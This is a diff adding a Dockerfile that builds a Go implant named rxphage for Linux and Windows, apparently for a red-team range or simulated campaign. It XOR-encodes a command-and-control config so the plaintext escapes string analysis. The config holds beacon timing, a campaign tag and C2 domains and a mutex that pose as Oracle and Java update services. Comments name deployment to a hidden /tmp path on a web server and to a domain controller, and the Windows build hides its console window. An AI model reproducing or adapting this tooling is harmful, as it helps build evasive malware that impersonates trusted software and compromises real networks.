@@ -1,0 +1,32 @@
+# ── Stage 1: Compile rxphage implant ────────────────────────────────────
+FROM golang:1.22-alpine AS builder
+
+RUN apk add --no-cache python3
+
+WORKDIR /src
+COPY rxphage/ .
+
+# Generate XOR-encoded config blob (key 0x4C).
+# Plaintext JSON never appears in the final binary — strings(1) finds nothing.
+RUN python3 -c "import json,sys; cfg={'c2_primary':'updates.oracle-cdn.com','c2_port':443,'c2_secondary':'telemetry.java-services.net','user_agent':'Java/1.8.0_321','mutex':'OracleJavaUpdater','sleep_min':30,'sleep_max':120,'jitter':0.2,'campaign':'DRAGONRX-2024-001'}; data=json.dumps(cfg,separators=(',',':')).encode(); sys.stdout.buffer.write(bytes(b^0x4C for b in data))" > config/config.bin
+
+# Linux ELF — deployed to web01 (/tmp/.cache/rxphage)
+RUN GOOS=linux GOARCH=amd64 go build \
+    -ldflags="-s -w" \
+    -o /out/rxphage .
+
+# Windows PE — deployed to DC01/WS01 (C:\Temp\rxphage.exe)
+RUN GOOS=windows GOARCH=amd64 go build \
+    -ldflags="-s -w -H=windowsgui" \
+    -o /out/rxphage.exe .
+
+# ── Stage 2: Copy pre-built binaries to /output volume on container start ─
+FROM alpine:3.19
+COPY --from=builder /out/ /built/
+
+# -n: skip if target already exists (idempotent across restarts)
+CMD ["sh", "-c", \
+     "mkdir -p /output/rxphage && \
+      cp -n /built/rxphage     /output/rxphage/rxphage && \
+      cp -n /built/rxphage.exe /output/rxphage/rxphage.exe && \
+      echo '[rxphage_builder] binaries deployed to /output/rxphage/'"]
